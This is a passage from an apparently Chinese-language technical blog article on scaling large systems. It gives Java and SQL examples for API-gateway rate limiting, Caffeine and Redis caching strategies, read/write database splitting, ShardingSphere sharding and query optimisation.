                    .retry(config -&gt; config
                        .setRetries(<span class="hljs-number">3</span>)
                        .setStatuses(HttpStatus.INTERNAL_SERVER_ERROR))
                )
                .uri(<span class="hljs-string">"lb://order-service"</span>))
            .build();
    }
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> RedisRateLimiter <span class="hljs-title function_">redisRateLimiter</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 每秒10个请求，突发容量20</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RedisRateLimiter</span>(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">1</span>);
    }
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> KeyResolver <span class="hljs-title function_">ipKeyResolver</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> exchange -&gt; Mono.just(
            exchange.getRequest().getRemoteAddress().getAddress().getHostAddress()
        );
    }
}
</code></pre>
<h2 data-id="heading-11">04 缓存策略：性能加速的智能分层</h2>
<p>缓存是提升系统性能最有效的手段之一。千万级系统需要设计智能的多级缓存策略。</p>
<h3 data-id="heading-12">四级缓存架构</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/94af7efb4b914d118986805a9825e3c4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770776606&amp;x-signature=sKizoiUNdeqhlaTVPzmlSK8mpyw%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-13">1. 本地缓存（Caffeine）</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalCacheManager</span> {
    
    <span class="hljs-comment">// 一级缓存：Guava Cache（适合较小数据量）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Cache&lt;String, Object&gt; guavaCache = CacheBuilder.newBuilder()
            .maximumSize(<span class="hljs-number">10000</span>)
            .expireAfterWrite(<span class="hljs-number">5</span>, TimeUnit.MINUTES)
            .recordStats()
            .build();
    
    <span class="hljs-comment">// 二级缓存：Caffeine（高性能，W-TinyLFU算法）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Cache&lt;String, Object&gt; caffeineCache = Caffeine.newBuilder()
            .maximumSize(<span class="hljs-number">50000</span>)
            .expireAfterWrite(<span class="hljs-number">10</span>, TimeUnit.MINUTES)
            .refreshAfterWrite(<span class="hljs-number">1</span>, TimeUnit.MINUTES)
            .recordStats()
            .build();
    
    <span class="hljs-comment">// 热点数据特殊缓存（如秒杀商品）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Cache&lt;String, Object&gt; hotDataCache = Caffeine.newBuilder()
            .maximumSize(<span class="hljs-number">1000</span>)
            .expireAfterWrite(<span class="hljs-number">30</span>, TimeUnit.SECONDS) <span class="hljs-comment">// 热点数据过期快</span>
            .recordStats()
            .build();
    
    <span class="hljs-keyword">public</span> &lt;T&gt; T <span class="hljs-title function_">getWithCache</span><span class="hljs-params">(String key, Class&lt;T&gt; clazz, 
                              Supplier&lt;T&gt; loader, CacheLevel level)</span> {
        <span class="hljs-keyword">switch</span> (level) {
            <span class="hljs-keyword">case</span> LOCAL_HOT:
                <span class="hljs-keyword">return</span> getFromHotCache(key, clazz, loader);
            <span class="hljs-keyword">case</span> LOCAL_NORMAL:
                <span class="hljs-keyword">return</span> getFromLocalCache(key, clazz, loader);
            <span class="hljs-keyword">case</span> DISTRIBUTED:
                <span class="hljs-keyword">return</span> getFromDistributedCache(key, clazz, loader);
            <span class="hljs-keyword">default</span>:
                <span class="hljs-keyword">return</span> loader.get();
        }
    }
    
    <span class="hljs-keyword">private</span> &lt;T&gt; T <span class="hljs-title function_">getFromLocalCache</span><span class="hljs-params">(String key, Class&lt;T&gt; clazz, Supplier&lt;T&gt; loader)</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">return</span> (T) caffeineCache.get(key, k -&gt; {
                <span class="hljs-type">T</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> loader.get();
                <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) {
                    <span class="hljs-comment">// 缓存空值，防止缓存穿透</span>
                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NullValue</span>();
                }
                <span class="hljs-keyword">return</span> value;
            });
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-comment">// 本地缓存异常，降级直接加载</span>
            <span class="hljs-keyword">return</span> loader.get();
        }
    }
}

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> LocalCacheManager cacheManager;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RedisTemplate&lt;String, Product&gt; redisTemplate;
    
    <span class="hljs-keyword">public</span> Product <span class="hljs-title function_">getProductWithCache</span><span class="hljs-params">(Long productId)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">cacheKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"product:"</span> + productId;
        
        <span class="hljs-keyword">return</span> cacheManager.getWithCache(cacheKey, Product.class, () -&gt; {
            <span class="hljs-comment">// 先查Redis分布式缓存</span>
            <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue().get(cacheKey);
            <span class="hljs-keyword">if</span> (product != <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">return</span> product;
            }
            
            <span class="hljs-comment">// Redis没有，查数据库</span>
            product = productRepository.findById(productId).orElse(<span class="hljs-literal">null</span>);
            <span class="hljs-keyword">if</span> (product != <span class="hljs-literal">null</span>) {
                <span class="hljs-comment">// 异步回写到Redis，不阻塞当前请求</span>
                CompletableFuture.runAsync(() -&gt; 
                    redisTemplate.opsForValue().set(cacheKey, product, <span class="hljs-number">1</span>, TimeUnit.HOURS)
                );
            }
            
            <span class="hljs-keyword">return</span> product;
        }, CacheLevel.LOCAL_NORMAL);
    }
}
</code></pre>
<h3 data-id="heading-14">2. 分布式缓存（Redis集群）</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedisConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> RedisConnectionFactory <span class="hljs-title function_">redisConnectionFactory</span><span class="hljs-params">()</span> {
        <span class="hljs-type">RedisClusterConfiguration</span> <span class="hljs-variable">clusterConfig</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RedisClusterConfiguration</span>();
        
        <span class="hljs-comment">// 集群节点配置</span>
        clusterConfig.addClusterNode(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RedisNode</span>(<span class="hljs-string">"192.168.1.100"</span>, <span class="hljs-number">6379</span>));
        clusterConfig.addClusterNode(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RedisNode</span>(<span class="hljs-string">"192.168.1.101"</span>, <span class="hljs-number">6379</span>));
        clusterConfig.addClusterNode(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RedisNode</span>(<span class="hljs-string">"192.168.1.102"</span>, <span class="hljs-number">6379</span>));
        
        <span class="hljs-comment">// 集群配置</span>
        clusterConfig.setMaxRedirects(<span class="hljs-number">3</span>); <span class="hljs-comment">// 最大重定向次数</span>
        
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JedisConnectionFactory</span>(clusterConfig);
    }
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> RedisTemplate&lt;String, Object&gt; <span class="hljs-title function_">redisTemplate</span><span class="hljs-params">()</span> {
        RedisTemplate&lt;String, Object&gt; template = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RedisTemplate</span>&lt;&gt;();
        template.setConnectionFactory(redisConnectionFactory());
        
        <span class="hljs-comment">// 使用String序列化器</span>
        template.setKeySerializer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRedisSerializer</span>());
        template.setValueSerializer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GenericJackson2JsonRedisSerializer</span>());
        
        <span class="hljs-comment">// 开启事务支持</span>
        template.setEnableTransactionSupport(<span class="hljs-literal">true</span>);
        
        <span class="hljs-keyword">return</span> template;
    }
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> RedisCacheManager <span class="hljs-title function_">cacheManager</span><span class="hljs-params">(RedisConnectionFactory connectionFactory)</span> {
        <span class="hljs-type">RedisCacheConfiguration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> RedisCacheConfiguration.defaultCacheConfig()
                .entryTtl(Duration.ofMinutes(<span class="hljs-number">30</span>)) <span class="hljs-comment">// 默认过期时间</span>
                .disableCachingNullValues() <span class="hljs-comment">// 不缓存null值</span>
                .serializeKeysWith(RedisSerializationContext.SerializationPair
                        .fromSerializer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRedisSerializer</span>()))
                .serializeValuesWith(RedisSerializationContext.SerializationPair
                        .fromSerializer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GenericJackson2JsonRedisSerializer</span>()));
        
        <span class="hljs-comment">// 不同缓存区域的不同配置</span>
        Map&lt;String, RedisCacheConfiguration&gt; cacheConfigurations = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        cacheConfigurations.put(<span class="hljs-string">"product"</span>, config.entryTtl(Duration.ofHours(<span class="hljs-number">1</span>)));
        cacheConfigurations.put(<span class="hljs-string">"user"</span>, config.entryTtl(Duration.ofDays(<span class="hljs-number">1</span>)));
        
        <span class="hljs-keyword">return</span> RedisCacheManager.builder(connectionFactory)
                .cacheDefaults(config)
                .withInitialCacheConfigurations(cacheConfigurations)
                .transactionAware()
                .build();
    }
}
</code></pre>
<h3 data-id="heading-15">3. 缓存策略与问题解决</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheStrategyService</span> {
    
    <span class="hljs-comment">/**
     * 防止缓存穿透：缓存空值
     */</span>
    <span class="hljs-keyword">public</span> Product <span class="hljs-title function_">getProductWithNullCache</span><span class="hljs-params">(Long productId)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">cacheKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"product:"</span> + productId;
        <span class="hljs-type">String</span> <span class="hljs-variable">nullCacheKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"product_null:"</span> + productId;
        
        <span class="hljs-comment">// 先检查空值缓存</span>
        <span class="hljs-keyword">if</span> (Boolean.TRUE.equals(redisTemplate.hasKey(nullCacheKey))) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// 知道是空值，直接返回，不查数据库</span>
        }
        
        <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue().get(cacheKey);
        <span class="hljs-keyword">if</span> (product != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> product;
        }
        
        <span class="hljs-comment">// 加分布式锁，防止缓存击穿</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">lockKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"lock:product:"</span> + productId;
        <span class="hljs-type">boolean</span> <span class="hljs-variable">locked</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">try</span> {
            locked = tryLock(lockKey, <span class="hljs-number">3</span>, TimeUnit.SECONDS);
            <span class="hljs-keyword">if</span> (locked) {
                <span class="hljs-comment">// 双重检查</span>
                product = redisTemplate.opsForValue().get(cacheKey);
                <span class="hljs-keyword">if</span> (product != <span class="hljs-literal">null</span>) {
                    <span class="hljs-keyword">return</span> product;
                }
                
                <span class="hljs-comment">// 查询数据库</span>
                product = productRepository.findById(productId).orElse(<span class="hljs-literal">null</span>);
                
                <span class="hljs-keyword">if</span> (product == <span class="hljs-literal">null</span>) {
                    <span class="hljs-comment">// 缓存空值，过期时间短</span>
                    redisTemplate.opsForValue().set(nullCacheKey, <span class="hljs-string">"NULL"</span>, <span class="hljs-number">5</span>, TimeUnit.MINUTES);
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-comment">// 缓存数据</span>
                    redisTemplate.opsForValue().set(cacheKey, product, <span class="hljs-number">1</span>, TimeUnit.HOURS);
                }
                
                <span class="hljs-keyword">return</span> product;
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// 未获取到锁，短暂等待后重试或返回降级数据</span>
                Thread.sleep(<span class="hljs-number">100</span>);
                <span class="hljs-keyword">return</span> getProductWithNullCache(productId);
            }
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            Thread.currentThread().interrupt();
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">if</span> (locked) {
                releaseLock(lockKey);
            }
        }
    }
    
    <span class="hljs-comment">/**
     * 防止缓存雪崩：随机过期时间
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setWithRandomExpire</span><span class="hljs-params">(String key, Object value, <span class="hljs-type">long</span> baseExpire, TimeUnit unit)</span> {
        <span class="hljs-type">long</span> <span class="hljs-variable">expireTime</span> <span class="hljs-operator">=</span> unit.toMillis(baseExpire);
        
        <span class="hljs-comment">// 增加随机偏移量（±20%）</span>
        <span class="hljs-type">double</span> <span class="hljs-variable">randomFactor</span> <span class="hljs-operator">=</span> <span class="hljs-number">0.8</span> + Math.random() * <span class="hljs-number">0.4</span>; <span class="hljs-comment">// 0.8 ~ 1.2</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">actualExpire</span> <span class="hljs-operator">=</span> (<span class="hljs-type">long</span>) (expireTime * randomFactor);
        
        redisTemplate.opsForValue().set(
            key, value, actualExpire, TimeUnit.MILLISECONDS
        );
    }
    
    <span class="hljs-comment">/**
     * 热点数据发现与自动缓存
     */</span>
    <span class="hljs-meta">@Scheduled(fixedDelay = 60000)</span> <span class="hljs-comment">// 每分钟执行一次</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">discoverHotData</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 从Redis统计访问频率</span>
        Set&lt;String&gt; hotKeys = findHotKeys();
        
        <span class="hljs-keyword">for</span> (String key : hotKeys) {
            <span class="hljs-comment">// 将热点数据加载到本地缓存</span>
            <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue().get(key);
            <span class="hljs-keyword">if</span> (value != <span class="hljs-literal">null</span>) {
                localCache.put(key, value);
            }
        }
    }
}
</code></pre>
<h2 data-id="heading-16">05 数据库设计：从单机到分布式</h2>
<p>数据库是系统的核心，也是千万级系统最难扩展的部分。</p>
<h3 data-id="heading-17">读写分离</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataSourceConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-meta">@Primary</span>
    <span class="hljs-keyword">public</span> DataSource <span class="hljs-title function_">dataSource</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 主从数据源配置</span>
        Map&lt;Object, Object&gt; targetDataSources = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        
        <span class="hljs-comment">// 主库</span>
        <span class="hljs-type">DataSource</span> <span class="hljs-variable">masterDataSource</span> <span class="hljs-operator">=</span> createDataSource(
            <span class="hljs-string">"jdbc:mysql://master-db:3306/db?useSSL=false"</span>,
            <span class="hljs-string">"master_user"</span>,
            <span class="hljs-string">"master_password"</span>
        );
        targetDataSources.put(DataSourceType.MASTER, masterDataSource);
        
        <span class="hljs-comment">// 从库1</span>
        <span class="hljs-type">DataSource</span> <span class="hljs-variable">slave1DataSource</span> <span class="hljs-operator">=</span> createDataSource(
            <span class="hljs-string">"jdbc:mysql://slave1-db:3306/db?useSSL=false"</span>,
            <span class="hljs-string">"slave_user"</span>,
            <span class="hljs-string">"slave_password"</span>
        );
        targetDataSources.put(<span class="hljs-string">"slave1"</span>, slave1DataSource);
        
        <span class="hljs-comment">// 从库2</span>
        <span class="hljs-type">DataSource</span> <span class="hljs-variable">slave2DataSource</span> <span class="hljs-operator">=</span> createDataSource(
            <span class="hljs-string">"jdbc:mysql://slave2-db:3306/db?useSSL=false"</span>,
            <span class="hljs-string">"slave_user"</span>,
            <span class="hljs-string">"slave_password"</span>
        );
        targetDataSources.put(<span class="hljs-string">"slave2"</span>, slave2DataSource);
        
        <span class="hljs-comment">// 动态数据源</span>
        <span class="hljs-type">DynamicDataSource</span> <span class="hljs-variable">dynamicDataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DynamicDataSource</span>();
        dynamicDataSource.setDefaultTargetDataSource(masterDataSource);
        dynamicDataSource.setTargetDataSources(targetDataSources);
        
        <span class="hljs-keyword">return</span> dynamicDataSource;
    }
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> AbstractRoutingDataSource <span class="hljs-title function_">routingDataSource</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbstractRoutingDataSource</span>() {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">determineCurrentLookupKey</span><span class="hljs-params">()</span> {
                <span class="hljs-keyword">return</span> DynamicDataSourceContextHolder.getDataSourceType();
            }
        };
    }
    
    <span class="hljs-meta">@Aspect</span>
    <span class="hljs-meta">@Component</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataSourceAspect</span> {
        
        <span class="hljs-meta">@Before("@annotation(com.example.annotation.Master)")</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setMasterDataSource</span><span class="hljs-params">()</span> {
            DynamicDataSourceContextHolder.setDataSourceType(DataSourceType.MASTER);
        }
        
        <span class="hljs-meta">@Before("@annotation(com.example.annotation.Slave)")</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setSlaveDataSource</span><span class="hljs-params">()</span> {
            <span class="hljs-comment">// 随机选择从库</span>
            String[] slaves = {<span class="hljs-string">"slave1"</span>, <span class="hljs-string">"slave2"</span>};
            <span class="hljs-type">String</span> <span class="hljs-variable">selectedSlave</span> <span class="hljs-operator">=</span> slaves[ThreadLocalRandom.current().nextInt(slaves.length)];
            DynamicDataSourceContextHolder.setDataSourceType(selectedSlave);
        }
        
        <span class="hljs-meta">@After("@annotation(com.example.annotation.Master) || " +
               "@annotation(com.example.annotation.Slave)")</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">clearDataSource</span><span class="hljs-params">()</span> {
            DynamicDataSourceContextHolder.clearDataSourceType();
        }
    }
}

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    
    <span class="hljs-meta">@Master</span> <span class="hljs-comment">// 使用主库</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">(Order order)</span> {
        orderRepository.save(order); <span class="hljs-comment">// 写操作</span>
    }
    
    <span class="hljs-meta">@Slave</span> <span class="hljs-comment">// 使用从库</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">getOrder</span><span class="hljs-params">(Long orderId)</span> {
        <span class="hljs-keyword">return</span> orderRepository.findById(orderId).orElse(<span class="hljs-literal">null</span>); <span class="hljs-comment">// 读操作</span>
    }
}
</code></pre>
<h3 data-id="heading-18">分库分表</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 分片策略：用户ID取模分片</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserShardingStrategy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">PreciseShardingAlgorithm</span>&lt;Long&gt; {
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">doSharding</span><span class="hljs-params">(Collection&lt;String&gt; availableTargetNames, 
                             PreciseShardingValue&lt;Long&gt; shardingValue)</span> {
        <span class="hljs-type">long</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> shardingValue.getValue();
        
        <span class="hljs-comment">// 分片数</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">shardCount</span> <span class="hljs-operator">=</span> availableTargetNames.size();
        
        <span class="hljs-comment">// 简单取模分片</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">shardIndex</span> <span class="hljs-operator">=</span> userId % shardCount;
        
        <span class="hljs-keyword">for</span> (String tableName : availableTargetNames) {
            <span class="hljs-keyword">if</span> (tableName.endsWith(<span class="hljs-string">"_"</span> + shardIndex)) {
                <span class="hljs-keyword">return</span> tableName;
            }
        }
        
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>(<span class="hljs-string">"无法找到对应的分片表"</span>);
    }
}

<span class="hljs-comment">// 分库分表配置</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShardingConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> DataSource <span class="hljs-title function_">shardingDataSource</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-comment">// 数据源映射</span>
        Map&lt;String, DataSource&gt; dataSourceMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        dataSourceMap.put(<span class="hljs-string">"ds0"</span>, createDataSource(<span class="hljs-string">"jdbc:mysql://db0:3306/db"</span>));
        dataSourceMap.put(<span class="hljs-string">"ds1"</span>, createDataSource(<span class="hljs-string">"jdbc:mysql://db1:3306/db"</span>));
        dataSourceMap.put(<span class="hljs-string">"ds2"</span>, createDataSource(<span class="hljs-string">"jdbc:mysql://db2:3306/db"</span>));
        
        <span class="hljs-comment">// 用户表分片规则</span>
        <span class="hljs-type">ShardingRuleConfiguration</span> <span class="hljs-variable">shardingRuleConfig</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShardingRuleConfiguration</span>();
        
        <span class="hljs-comment">// 用户表分表规则</span>
        <span class="hljs-type">TableRuleConfiguration</span> <span class="hljs-variable">userTableRuleConfig</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TableRuleConfiguration</span>(<span class="hljs-string">"user"</span>, <span class="hljs-string">"ds${0..2}.user_${0..7}"</span>);
        userTableRuleConfig.setDatabaseShardingStrategyConfig(
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InlineShardingStrategyConfiguration</span>(<span class="hljs-string">"id"</span>, <span class="hljs-string">"ds${id % 3}"</span>)
        );
        userTableRuleConfig.setTableShardingStrategyConfig(
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardShardingStrategyConfiguration</span>(<span class="hljs-string">"id"</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserShardingStrategy</span>())
        );
        
        <span class="hljs-comment">// 订单表分表规则</span>
        <span class="hljs-type">TableRuleConfiguration</span> <span class="hljs-variable">orderTableRuleConfig</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TableRuleConfiguration</span>(<span class="hljs-string">"order"</span>, <span class="hljs-string">"ds${0..2}.order_${0..15}"</span>);
        orderTableRuleConfig.setDatabaseShardingStrategyConfig(
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InlineShardingStrategyConfiguration</span>(<span class="hljs-string">"user_id"</span>, <span class="hljs-string">"ds${user_id % 3}"</span>)
        );
        orderTableRuleConfig.setTableShardingStrategyConfig(
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InlineShardingStrategyConfiguration</span>(<span class="hljs-string">"order_id"</span>, <span class="hljs-string">"order_${order_id % 16}"</span>)
        );
        
        shardingRuleConfig.getTableRuleConfigs().add(userTableRuleConfig);
        shardingRuleConfig.getTableRuleConfigs().add(orderTableRuleConfig);
        
        <span class="hljs-comment">// 创建ShardingSphere数据源</span>
        <span class="hljs-keyword">return</span> ShardingSphereDataSourceFactory.createDataSource(
            dataSourceMap, Collections.singleton(shardingRuleConfig), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>()
        );
    }
}
</code></pre>
<h3 data-id="heading-19">数据库优化实战</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 1. 索引优化示例</span>
<span class="hljs-comment">-- 错误的索引设计</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_user_email <span class="hljs-keyword">ON</span> <span class="hljs-keyword">user</span>(email); <span class="hljs-comment">-- 过长的索引</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_user_status <span class="hljs-keyword">ON</span> <span class="hljs-keyword">user</span>(status); <span class="hljs-comment">-- 低区分度的索引</span>

<span class="hljs-comment">-- 正确的索引设计</span>
<span class="hljs-comment">-- 联合索引，注意字段顺序</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_user_created_status <span class="hljs-keyword">ON</span> <span class="hljs-keyword">user</span>(created_at, status);
<span class="hljs-comment">-- 前缀索引，适合长字段</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_user_email_prefix <span class="hljs-keyword">ON</span> <span class="hljs-keyword">user</span>(email(<span class="hljs-number">20</span>));

<span class="hljs-comment">-- 2. 慢查询优化示例</span>
<span class="hljs-comment">-- 优化前：全表扫描</span>
EXPLAIN <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">YEAR</span>(created_at) <span class="hljs-operator">=</span> <span class="hljs-number">2024</span>;

<span class="hljs-comment">-- 优化后：使用索引</span>
EXPLAIN <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">order</span> 
<span class="hljs-keyword">WHERE</span> created_at <span class="hljs-operator">&gt;=</span> <span class="hljs-string">'2024-01-01'</span> 
  <span class="hljs-keyword">AND</span> created_at <span class="hljs-operator">&lt;</span> <span class="hljs-string">'2025-01-01'</span>;

<span class="hljs-comment">-- 3. 分页优化</span>
<span class="hljs-comment">-- 传统分页（数据量大时慢）</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> id LIMIT <span class="hljs-number">1000000</span>, <span class="hljs-number">20</span>;

<span class="hljs-comment">-- 优化分页（使用覆盖索引）</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span> 
<span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">&gt;</span> (<span class="hljs-keyword">SELECT</span> id <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> id LIMIT <span class="hljs-number">1000000</span>, <span class="hljs-number">1</span>)
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> id LIMIT <span class="hljs-number">20</span>;

<span class="hljs-comment">-- 4. 批量操作优化</span>
<span class="hljs-comment">-- 批量插入</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">user</span> (name, email) <span class="hljs-keyword">VALUES</span> 
(<span class="hljs-string">'user1'</span>, <span class="hljs-string">'user1@example.com'</span>),
(<span class="hljs-string">'user2'</span>, <span class="hljs-string">'user2@example.com'</span>),
<span class="hljs-comment">-- ... 1000条</span>
(<span class="hljs-string">'user1000'</span>, <span class="hljs-string">'user1000@example.com'</span>);

<span class="hljs-comment">-- 批量更新（避免在循环中单条更新）</span>
<span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">SET</span> status <span class="hljs-operator">=</span> <span class="hljs-string">'active'</span> 
<span class="hljs-keyword">WHERE</span> id <span class="hljs-keyword">IN</span> (<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, ..., <span class="hljs-number">1000</span>);
</code></pre>
<h2 data-id="heading-20">06 异步处理与消息队列</h2>
<p>对于千万级系统，同步处理所有请求是不现实的。异步化是提高系统吞吐量的关键。</p>
<h3 data-id="heading-21">消息队列设计</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
